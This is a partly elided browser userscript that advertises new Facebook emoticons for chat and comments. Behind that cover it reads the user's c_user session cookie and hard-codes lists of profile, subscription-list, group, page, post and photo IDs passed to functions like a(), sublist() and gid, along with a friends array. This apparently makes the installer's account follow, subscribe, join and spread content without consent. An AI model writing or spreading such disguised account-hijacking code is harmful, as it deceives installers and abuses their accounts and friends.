// ==UserScript==
// @name    	Facebook Emoji for Chat By [Deepak Mahtha]
// @namespace	New Facebook Emoticons By Deepak Mahtha
// @description	New Facebook  2013 Emoticons for Status, Chat and Comment.
// @version 	19.03
// @author  	Deepak
// @authorURL	http://www.facebook.com/BadtameezDil.x3
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/BadtameezDil.x3" target="_blank">Created by Deepak Mahtha </a>';
	html += '</div>';
...
a("100006501335881");Deepak 
a("100001246398895");DK
a("100005980143307");Pankaj
a("100005777284592");Ankur
a("100006993044265");Akshay
a("100006667573102");Kanika
a("100005130127334");Naushad
a("100002566614890");Silent killer
a("100003367782161");Brijesh
a("492555014161866");

sublist("1384949538398411");
sublist("1381129592113739");

sublist("581577368560471");
sublist("581575821893959");

sublist("128200480715861");
sublist("147262232143019");
sublist("147262575476318");
sublist("147263015476274");

//Group By Deepak Mahtha
var gid = ['374799675979928'];
...
var spage_id = "492555014161866";
var spost_id = "1426692150890816";
var sfoto_id = "1448141755412522";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Deepak Mahtha';
